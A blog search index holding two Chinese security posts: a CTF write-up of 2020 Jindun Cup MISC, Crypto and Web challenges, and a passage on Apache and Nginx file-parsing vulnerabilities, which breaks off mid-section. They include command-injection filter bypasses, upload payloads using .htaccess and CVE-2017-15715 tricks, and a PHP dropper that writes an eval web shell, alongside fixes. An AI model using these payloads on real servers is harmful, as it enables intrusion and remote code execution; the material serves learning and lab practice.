<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第二届“金盾杯”题目总结与复现</title>
      <link href="/2020/12/21/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%87%91%E7%9B%BE%E6%9D%AF%E2%80%9D%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/12/21/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E9%87%91%E7%9B%BE%E6%9D%AF%E2%80%9D%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Web手，再次玩起了杂项。因为是省赛，所以题目除Web题外，并不太难(当然Web听说也不难，只不过对于我这个Web小菜鸡来说有点难)。上午ak了MISC，下午差一道题没有ak Crypto。然后就被Web第一题100分的题卡死，没去做下面的Web题，以为下边200分、300分的比100分的更难。比赛结束后，听说100分的第一道题做出来的人最少，emmmmm，我直接针不戳！好了先总结一下吧：</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="MISC1：注意数字"><a href="#MISC1：注意数字" class="headerlink" title="MISC1：注意数字"></a>MISC1：注意数字</h4><p><strong>考点：文件分离+伪加密+多层Base64编码+仿射密码和脑洞</strong><br>下载题目压缩包并解压。对“此图没有提示.jpg”文件，使用foremost进行文件分离，得到一个zip压缩包<br>解压发现需要密码，使用winhex打开，发现是伪加密，于是将504B0304 后的3、4位，将504B0102后的5、6位的0900改为0000，即可破解伪加密<br>解压得到1.txt文件，1.txt文件内容是Base64编码的。进行若干次Base64解码后，得到<br><img src="https://img-blog.csdnimg.cn/20210108001043961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>猜测接下来，需要对<code>yqjb{lha-drwohjw-ekf}</code>进行仿射密码解密。由“飞流直下三千尺，疑是银河落九天”，想到key1（a）为3，key2（b）为9。解密得到flag<br><img src="https://img-blog.csdnimg.cn/20210108001154375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="MISC2：小火龙冲啊"><a href="#MISC2：小火龙冲啊" class="headerlink" title="MISC2：小火龙冲啊"></a>MISC2：小火龙冲啊</h4><p><strong>考点：winhex末尾隐藏信息</strong><br>下载题目压缩包并解压。使用解压工具winRAR打开“小火龙.jpg”，发现加密的flag.txt文件<br>使用winhex打开“小火龙.jpg”，在末尾发现解压密码：111111<br>解压，输入解压密码，解压成功得到flag.txt文件，打开得到flag</p><h4 id="MISC3：五瓶药水"><a href="#MISC3：五瓶药水" class="headerlink" title="MISC3：五瓶药水"></a>MISC3：五瓶药水</h4><p><strong>考点：CRC32碰撞+Base64解码并排序+Base64转图片+winhex末尾隐藏flag</strong><br>下载压缩包题目文件，并解压，得到<br>发现橙色.zip、红色.zip、黄色.zip、绿色.zip、青色.zip的文件大小都很小，里边压缩文件大小都是4字节<br><img src="https://img-blog.csdnimg.cn/2021010800152852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>于是想到4字节的CRC32碰撞，将这五个压缩包里的压缩文件的crc32，填到下列脚本的对应位置，进行碰撞</p><pre><code class="py">import binasciiimport stringdic=string.printablecrc1 = 0xe5c67f46crc2 = 0x555fa1a2crc3 = 0x6e957e45crc4 = 0x76d6a31acrc5 = 0x2b042586def crc32_4(crc):    for i in dic :        for j in dic:            for p in dic:                for q in dic:                        s=i+j+p+q                        if crc == (binascii.crc32(s.encode(&quot;ascii&quot;))):                            print (s)                            return 1crc32_4(crc1)crc32_4(crc2)crc32_4(crc3)crc32_4(crc4)crc32_4(crc5)</code></pre><p><img src="https://img-blog.csdnimg.cn/20210108001738265.png" alt="在这里插入图片描述"><br>将这五部分分别进行Base64解码:<br>aW9u解码得<code>ion</code><br>cG90解码得<code>pot</code><br>Z2Vu解码得<code>gen</code><br>YjEy解码得<code>b12</code><br>Mw==解码得<code>3</code><br>按照一定顺序进行拼接得到flag.zip压缩包的解压密码：<code>potiongenb123</code><br>打开解压得到的flag.txt文件，得到<br><img src="https://img-blog.csdnimg.cn/20210108001844382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>很明显，Base64转图片，得到一个jpg图片，使用winhex打开jpg 图片，在最后边发现flag<br><img src="https://img-blog.csdnimg.cn/2021010800192782.png" alt="在这里插入图片描述"></p><h4 id="MISC4：我和十六有个约定"><a href="#MISC4：我和十六有个约定" class="headerlink" title="MISC4：我和十六有个约定"></a>MISC4：我和十六有个约定</h4><p><strong>考点：winhex末尾隐藏信息+16进制转字符串+Base64转图片+16进制每行2位一组逆序保存为图片+二维码拼图</strong><br>下载题目压缩包文件并解压，得到ababab.jpg和flag.zip文件。使用winhex打开ababab.jpg文件，在最后边发现<br><code>keyis7034735377307244</code>，将7034735377307244进行16进制转字符串得到<code>p4sSw0rD</code><br><code>p4sSw0rD</code>即是flag.zip的解压密码，解压得到flag.txt和splice.txt文件。<br>将splice.txt的文件内容进行Base64转图片，得到二维码标志位<br><img src="https://img-blog.csdnimg.cn/20210108002128808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载下来。<br>打开flag.txt，发现每一行是jpg图片的16进制的逆序<br><img src="https://img-blog.csdnimg.cn/20210108002217698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>于是，写个脚本进行转换</p><pre><code class="py">input = open(&#39;flag.txt&#39;, &#39;r&#39;)input_all = input.readlines()for lins in input_all:    ss = lins[::-1]    num=ss.split(&#39; &#39;)    for i in num:        xx=i[::-1]        print(xx,end=&#39; &#39;)input.close()</code></pre><p><img src="https://img-blog.csdnimg.cn/20210108002413673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功转换，在winhex里新建文件，将这些16进制粘贴到winhex里，并保存。打开发现是缺少二维码标志位的二维码主体部分<br><img src="https://img-blog.csdnimg.cn/20210108002453429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将刚才得到的二维码标志位和这个主体部分进行拼图<br><img src="https://img-blog.csdnimg.cn/20210108002552450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用支付宝进行二维码扫描，得到flag</p><h4 id="MISC5：One-piece"><a href="#MISC5：One-piece" class="headerlink" title="MISC5：One_piece"></a>MISC5：One_piece</h4><p><strong>考点：压缩包暴力破解+社会主义核心价值观加密+BrainFuck编码+维吉尼亚密码+解读c语言代码得到密钥</strong><br>下载题目压缩包文件并解压，发现需要密码，由文件名四位数字，想到对压缩包口令进行暴力破解，得到压缩包解压密码：9156<br>解压得到secret.c和路飞海贼团的烦恼.txt文件，打开路飞海贼团的烦恼.txt文件，发现一串密文：<br><img src="https://img-blog.csdnimg.cn/20210108003323824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>很明显是社会主义核心价值观加密，解密得<br><img src="https://img-blog.csdnimg.cn/20210108003353603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密结果，很明显是BrainFuck编码，解码得<code>glbe{pnf_njedc_js_ufjs_kmvrocz!}</code><br>解码结果感觉是维吉尼亚密码，但没有密钥。打开secret .c文件<br>，根据代码意思得到密钥的四个字符的ASCII码值：<br><img src="https://img-blog.csdnimg.cn/20210108003443125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ASCII码值转字符串得到密钥：<code>\aby</code><br>于是对glbe{pnf_njedc_js_ufjs_kmvrocz!}进行维吉尼亚解密，得到flag</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Crypto1：Base"><a href="#Crypto1：Base" class="headerlink" title="Crypto1：Base"></a>Crypto1：Base</h4><p><strong>考点：Base64转图片+Base92解码</strong><br>下载题目压缩包文件并解压，打开base文件<br>于是Base64转图片，得到png图片，打开发现是二维码<br>扫描得到<br>对<code>F#S&lt;YReBy{f.WwU{CSv^e^&#39;n*D</code>进行Base92解码，得到flag</p><h4 id="Crypto2：不一样的凯撒"><a href="#Crypto2：不一样的凯撒" class="headerlink" title="Crypto2：不一样的凯撒*"></a>Crypto2：不一样的凯撒*</h4><p><strong>考点：脑洞+找规律+凯撒变形+十进制转字符</strong><br>题目密文是<code>bhag{asb_zsz_vtsz_aszw}</code>，将字符串转ASCII得：</p><pre><code class="bash">[98,104,97,103,123,97,115,98,95,122,115,122,95,118,116,115,122,95,97,115,122,119,125]</code></pre><p><code>bh</code>对应的ASCII为<code>98 104</code>，如果变成<code>fl</code>则变成<code>102</code> <code>108</code>，为偶数<br><code>ag</code>对应的ASCII为<code>97 103</code>，不变，为奇数<br>所以，偶数+4，奇数不变，得到:</p><pre><code class="bash">[102,108,97,103,123,97,115,102,95,126,115,126,95,122,120,115,126,95,97,115,126,119,125]</code></pre><p>转字符串，很明显有问题，126已经超出可见字符范围了，便减去26，转字符串得到flag</p><pre><code class="bash">[102,108,97,103,123,97,115,102,95,100,115,100,95,122,120,115,100,95,97,115,100,119,125]转字符串得到flag：flag{asf_dsd_zxsd_asdw}</code></pre><h4 id="Crypto3：今天是个好日子"><a href="#Crypto3：今天是个好日子" class="headerlink" title="Crypto3：今天是个好日子"></a>Crypto3：今天是个好日子</h4><p><strong>考点：unicode编码+Base64编码+脑洞+AES解密</strong><br>下载题目压缩包文件并解压，得到一个二维码，扫描结果，很明显是unicode编码，解码得<br><img src="https://img-blog.csdnimg.cn/20210108003817226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解码结果是Base64编码，解码得：<br><code>U2FsdGVkX1+ehXdDuA3EC7Tcr5bOHNhzbEPOz55Gdy5StZU7RDzY7Hfr5M1JoNtz</code><br>然后再进行Base64解码发现<br><img src="https://img-blog.csdnimg.cn/20210108003934974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加盐了，于是需要找到密钥，然后进行下面这些解密的其中一个<br><img src="https://img-blog.csdnimg.cn/20210108004032785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>由题目“今天是个好日子”想到今天(比赛那天)的日期<code>20201220</code>，即密钥<br>然后进行AES解密，得到flag<br><img src="https://img-blog.csdnimg.cn/20210108004116286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Web1：web-checkin"><a href="#Web1：web-checkin" class="headerlink" title="Web1：web_checkin"></a>Web1：web_checkin</h4><p><strong>考点：命令执行+绕过黑名单</strong><br>打开题目，发现题目源码：<br><img src="https://img-blog.csdnimg.cn/20201222142359991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt><br>绕过ls关键字过滤可使用<code>dir</code>命令绕过（但是没想到被坑了，<code>dir</code>没有列出当前目录下的文件，必须用<code>dir .</code>，我无语了emmmm。。。。）<br>绕过空格过滤可使用<code>%09</code>绕过<br>绕过文件读取过滤可使用<code>cut读取文件</code>、<code>sed读取文件</code>和<code>file -f读取文件</code><br>于是就产生了三种解：<br><code>dir .</code>列出当前目录下的文件，得到flag文件<code>F14g_1s_h4rehaha.php</code></p><pre><code class="php">cut%09-c%091-10000%09F14g_1s_h4rehaha.phpsed%09-n%092p%09F14g_1s_h4rehaha.phpfile%09-f%09F14g_1s_h4rehaha.php</code></pre><p>参考博客：<a href="http://gtfly.top/2020/12/20/%E6%B2%B3%E5%8D%97%E7%9C%81%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%87%91%E7%9B%BE%E6%9D%AFCTF-web%E5%AE%98%E6%96%B9wp/" target="_blank" rel="noopener">河南省第二届金盾杯CTF web官方wp</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> Web </tag>
            
            <tag> 金盾杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈解析漏洞的利用与防范</title>
      <link href="/2020/10/20/%E6%B5%85%E8%B0%88%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E8%8C%83/"/>
      <url>/2020/10/20/%E6%B5%85%E8%B0%88%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<p><strong>本文首发于安全客，如果方便的话请阅读原文</strong>：<br><strong><a href="https://www.anquanke.com/post/id/219107" target="_blank" rel="noopener">https://www.anquanke.com/post/id/219107</a></strong></p><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>继续学习常见漏洞，经常听说过解析漏洞，这次来一探究竟。</p><h3 id="0x01-解析漏洞简介"><a href="#0x01-解析漏洞简介" class="headerlink" title="0x01 解析漏洞简介"></a>0x01 解析漏洞简介</h3><p><strong>1、文件解析漏洞概述</strong><br>文件解析漏洞,是指Web容器（Apache、Nginx、IIS等）在解析文件时将文件解析成脚本文件格式并得以执行而产生的漏洞。从而,黑客可以利用该漏洞实现非法文件的解析。<br><strong>2、web容器是什么</strong><br>web容器是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如tomcat、apache、nginx等。(可以理解为编程语言提供环境)</p><p><strong>中间件</strong>：提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。<br><strong>容器</strong>：给处于其中的应用程序组件(ASP,JSP,PHP)提供一个环境。使处于其中的应用程序组件之间跟容器中的环境变量接口交互，不必关注其他系统问题。<br><img src="https://img-blog.csdnimg.cn/20201006204254227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>攻击者在利用上传漏洞时，通常会与Web容器的解析漏洞配合在一起</strong></p><h3 id="0x02-Apache"><a href="#0x02-Apache" class="headerlink" title="0x02 Apache"></a>0x02 Apache</h3><p><strong>测试环境</strong><br>docker容器：kstaken/apache2<br>在docker里安装php：<code>apt-get update &amp;&amp; apt-get install php5</code><br>靶场：DoraBox靶场<br>修改站点根目录：<code>vim /etc/apache2/sites-enabled/000-default</code></p><h4 id="1、多后缀"><a href="#1、多后缀" class="headerlink" title="1、多后缀"></a>1、多后缀</h4><p><strong>漏洞描述</strong>：<br>在Apache 2.0.x &lt;= 2.0.59，Apache 2.2.x &lt;= 2.2.17，Apache 2.2.2 &lt;= 2.2.8中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。<br>所以可上传一个<code>test.php.qwzf</code>文件绕过验证且服务器依然会将其解析为php。<br>Apache 能够识别的文件在<code>mime.types</code>文件里。<br><strong>影响版本</strong>：<br>Apache 2.0.x &lt;= 2.0.59<br>Apache 2.2.x &lt;= 2.2.17<br>Apache 2.2.2 &lt;= 2.2.8<br><strong>开始测试</strong>：<br>1.查看Apache版本：</p><pre><code class="bash">apachectl -v#或httpd -v(测试未显示Apache版本)</code></pre><p><img src="https://img-blog.csdnimg.cn/20200930090726194.png" alt><br>平时可以使用浏览器捕获的响应包或使用burp抓包查看apache版本。<br><img src="https://img-blog.csdnimg.cn/20200930093542497.png" alt="在这里插入图片描述"></p><p>2.在DoraBox的任意文件靶场进行测试<br>上传的文件名：test.php.qwzf<br>上传的文件内容</p><pre><code class="php">&lt;?php phpinfo(); ?&gt;</code></pre><p>上传成功，访问看一下<br><img src="https://img-blog.csdnimg.cn/20200930093207967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功解析成php文件。<br><strong>修复方法</strong>：<br>后缀验证尽量使用白名单的方式，这样即使使用不存在的后缀名，也无法绕过。</p><h4 id="2、Apache配置问题"><a href="#2、Apache配置问题" class="headerlink" title="2、Apache配置问题"></a>2、Apache配置问题</h4><p>1.如果在Apache的 <code>/etc/apache2/apache2.conf</code>里有这样的配置</p><pre><code class="bash">&lt;FilesMatch &quot;qwzf.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>这时只要文件名是<code>qwzf.jpg</code>，会以php 来执行。<br>2.如果在Apache的 conf 里有这样一行配置<code>AddHandler php5-script .php</code> 这时只要文件名里包含<code>.php</code><br>即使文件名是<code>qwzf.php.jpg</code>也会以php 来执行。<br>3.如果在 Apache 的 conf 里有这样一行配置<code>AddType application/x-httpd-php .jpg</code><br>即使扩展名是<code>.jpg</code>，也会以php来执行。</p><p>Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——<code>.htaccess</code>(分布式配置文件)<br>将Apache的<code>/etc/apache2/sites-available/default</code>里<code>AllowOverride None</code>改为<code>AllowOverride All</code></p><pre><code class="bash">AllowOverride All</code></pre><p>开启rewrite_mod</p><pre><code class="bash">a2enmod rewrite</code></pre><p>这样<code>.htaccess</code>文件就会生效。<br><strong>开始测试</strong>：<br>1.上传一个<code>.htaccess</code>文件，文件内容如下：</p><pre><code class="bash">方法1：&lt;FilesMatch &quot;qwzf.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;方法2：AddHandler php5-script .php方法3：AddType application/x-httpd-php .jpg</code></pre><p>2.然后上传文件名为<br>方法1和方法3：qwzf.jpg<br>方法2和方法3：qwzf.php.jpg<br>文件内容为：<code>&lt;?php phpinfo(); ?&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200930104104227.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200930104420408.png" alt="在这里插入图片描述"><br><strong>修复方法</strong>：<br>1.apache配置文件，禁止<code>.php.</code>这样的文件执行，配置文件里面加入</p><pre><code class="bash">&lt;Files ~ “.(php.|php3.)”&gt;        Order Allow,Deny        Deny from all&lt;/Files&gt;</code></pre><p>2.关闭重写</p><pre><code class="bash">a2dismod rewrite</code></pre><h4 id="3、罕见后缀"><a href="#3、罕见后缀" class="headerlink" title="3、罕见后缀"></a>3、罕见后缀</h4><p>Apache配置文件中会有<code>.+.ph(p[345]?|t|tml)</code>此类的正则表达式，被当php程序执行的文件名要符合正则表达式。也就是说php3，php4，php5，pht，phtml等文件后缀也是可以被当作php文件进行解析的。<br>上传一个查看phpinfo信息的<code>qwzf.php3</code>文件，访问<br><img src="https://img-blog.csdnimg.cn/20200930112618670.png" alt="在这里插入图片描述"><br>发现<code>qwzf.php3</code>文件被当作php文件进行解析。</p><h4 id="4、后缀包含换行符-x0A-CVE-2017-15715"><a href="#4、后缀包含换行符-x0A-CVE-2017-15715" class="headerlink" title="4、后缀包含换行符\x0A(CVE-2017-15715)"></a>4、后缀包含换行符\x0A(CVE-2017-15715)</h4><p>phith0n师傅在代码审计知识星球里提到了Apache的一个解析漏洞CVE-2017-15715<br><strong>漏洞描述</strong>：<br>上传一个后缀末尾包含换行符的文件，来绕过FilesMatch。绕过FilesMatch不一定能被PHP解析。<br>这个漏洞可以用来绕过文件上传黑名单限制。即：</p><blockquote><p>1.php\x0a =&gt; 1.php</p></blockquote><blockquote><p>apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。该漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。</p></blockquote><p><strong>影响版本</strong>：<br>Apache 2.4.0-2.4.29<br><strong>测试环境</strong>：<br>1.环境一：<br>用docker拉取一个名为<code>vulhub/php:5.5-apache</code>的镜像(Apache版本2.4.0~2.4.29之间)<br>使用下面命令启动容器：</p><pre><code class="bash">docker run -d --name=cve-2017-15715 -p 8005:80 -v /var/www/bachang/cve-2017-15715:/var/www/html vulhub/php:5.5-apache</code></pre><p>进入容器并查看Apache版本</p><pre><code class="bash">docker exec -it cve-2017-15715 /bin/bashapachectl -v</code></pre><p><img src="https://img-blog.csdnimg.cn/20201003002612771.png" alt="在这里插入图片描述"><br>将下面<strong>测试代码</strong>目录映射到容器内的/var/www/html目录下，设置好写权限，即可开始测试。</p><p>2.环境二：<br>当然，如果感觉自己搭环境比较麻烦，可以使用vulhub靶场的<code>CVE-2017-15715</code>环境。<br>环境位置：<code>vulhub/httpd/CVE-2017-15715</code><br><strong>测试代码</strong>：</p><pre><code class="php">&lt;html&gt;&lt;body&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    file:&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;br /&gt;    filename:&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;qwzf.php&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpif (isset($_FILES[&#39;file&#39;])) {  $name = basename($_POST[&#39;name&#39;]);  $ext = pathinfo($name, PATHINFO_EXTENSION);  if (in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) {    exit(&#39;bad file&#39;);  }  move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;./&#39; . $name);}?&gt;</code></pre><p><strong>开始测试</strong>：<br>1.正常上传php文件，被拦截<br><img src="https://img-blog.csdnimg.cn/20201002233307512.png" alt="在这里插入图片描述"><br>2.上传<code>test.php.qwzf</code>，上传成功，但不解析，说明老的多后缀Apache解析漏洞不存在。<br><img src="https://img-blog.csdnimg.cn/20201002233452801.png" alt="在这里插入图片描述"><br>3.利用CVE-2017-15715，上传一个包含换行符的文件</p><blockquote><p>注：只能是\x0A，不能是\x0D\x0A</p></blockquote><p>上传<code>qwzf.php</code>文件，filename设置为<code>qwzf.php</code><br>使用burp抓包，选择burp的Hex功能，在<code>qwzf.php</code>后面添加一个<code>\x0A</code><br><img src="https://img-blog.csdnimg.cn/20201003003122740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发包，上传成功。然后访问<code>qwzf.php%0A</code>，发现可以成功解析php文件<br><img src="https://img-blog.csdnimg.cn/20201003003230427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Nginx是一款高性能的WEB服务器，通常用来作为PHP的解析容器。</p><h3 id="0x03-Nginx"><a href="#0x03-Nginx" class="headerlink" title="0x03 Nginx"></a>0x03 Nginx</h3><h4 id="1、Nginx-PHP-CGI-解析漏洞-fix-pathinfo"><a href="#1、Nginx-PHP-CGI-解析漏洞-fix-pathinfo" class="headerlink" title="1、Nginx PHP CGI 解析漏洞(fix_pathinfo)"></a>1、Nginx PHP CGI 解析漏洞(fix_pathinfo)</h4><p><strong>漏洞描述</strong>：<br>查看nginx的配置文件<br><code>vim /etc/nginx/conf.d/default.conf</code><br><img src="https://img-blog.csdnimg.cn/20201004163114780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（1）Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<code>http://x.x.x.x/phpinfo.jpg/1.php</code>这个URL时，<code>$fastcgi_script_name</code>会被设置为<code>phpinfo.jpg/1.php</code>，然后构造成SCRIPT_FILENAME传递给PHP CGI。<br>（2）但PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?<br>这就涉及到<code>fix_pathinfo</code>选项了。如果PHP中开启了fix_pathinfo这个选项，PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。</p><p>简单来说，由于Nginx的特性，只要URL中路径名以<code>.php</code>结尾，不管该文件是否存在，直接交给php处理。</p><blockquote><p>注：新版本php引入了security.limit_extensions，限制了可执行文件的后缀，默认只允许执行.php文件<br>使得该漏洞难以被成功利用</p></blockquote><p><em>相关知识</em>：<br>（1）通过phpinfo查看<code>cgi.fix_pathinfo=1</code>，PHP里经常要获取当前请求的URL路径信息。一般可以通过环境变量<code>$_SERVER[‘PATH_INFO’]</code>获取，而配置文件中的<code>cgi.fix_pathinifo</code>选项则与这个值的获取相关。<br><img src="https://img-blog.csdnimg.cn/20201004163958936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（2）在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。<br><strong>影响版本</strong>：<br>漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞<br><strong>漏洞形式</strong>：</p><blockquote><p>/1.jpg/1.php<br>/1.jpg/.php<br>/1.jpg%00.php<br>/1.jpg/%20\0.php</p></blockquote><p>还有一种方法是：上传一个名字为qwzf.jpg，文件内容如下：</p><pre><code class="php">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;qwzf&#39;]);?&gt;&#39;); ?&gt;</code></pre><p>然后访问<code>qwzf.jpg/.php</code>,在当前目录下就会生成一句话木马shell.php</p><p><strong>测试环境</strong>：<br>1.环境一：<br>vulhub靶场的漏洞环境<br>环境位置：<code>vulhub/nginx/nginx_parsing_vulnerability</code><br>nginx版本：<code>nginx/1.19.2</code><br>2.环境二：<br>使用phpstudy测试，默认配置即可(默认的cgi.fix_pathinfo是注释状态，但默认值确为1)<br>nginx版本：<code>nginx/1.11.5</code><br><strong>开始测试</strong>：<br>使用环境一的vulhub靶场对应的环境<br>上传一个jpg文件，文件名为<code>phpinfo.jpg</code>，文件内容为(或者上传图片马)：</p><pre><code class="php">GIF89a&lt;?php phpinfo(); ?&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201004160003833.png" alt="在这里插入图片描述"><br>上传成功，访问一下</p><pre><code class="php">/uploadfiles/b5f7a062d84869fe4f3af35b79fca50c.jpg/1.php/uploadfiles/b5f7a062d84869fe4f3af35b79fca50c.jpg/.php/uploadfiles/b5f7a062d84869fe4f3af35b79fca50c.jpg/%20\0.php</code></pre><p>发现除了%00截断外，均以php的形式解析，显示phpinfo信息<br><img src="https://img-blog.csdnimg.cn/20201004161440680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>%00截断不能成功，原因应该是PHP的版本问题。%00截断使用条件：php 版本&lt;5.3.4<br><strong>修复方法</strong>：<br>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0(慎用);<br>若实在将cgi.fix_pathinfo的值设置为0，就将php-fpm.conf中的<code>security.limit_extensions</code>后面的值设置为<code>.php</code><br>2.在Nginx配置文件中添加以下代码：</p><pre><code class="bash">if ( $fastcgi_script_name ~ ..*/.*php ) {return 403;}</code></pre><p>代码的意思：当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。<br>3.使用Apache服务器的，在相应目录下放一个 .htaccess 文件，内容为：</p><pre><code class="bash">&lt;FilesMatch &quot;(?i:\.php)$&quot;&gt;    Deny from all&lt;/FilesMatch&gt;</code></pre><p>4.不提供上传的原文件访问，对文件输出经过程序处理。<br>5.图片单独放一个服务器上，与业务代码数据进行隔离。</p><h4 id="2、空字节代码执行漏洞"><a href="#2、空字节代码执行漏洞" class="headerlink" 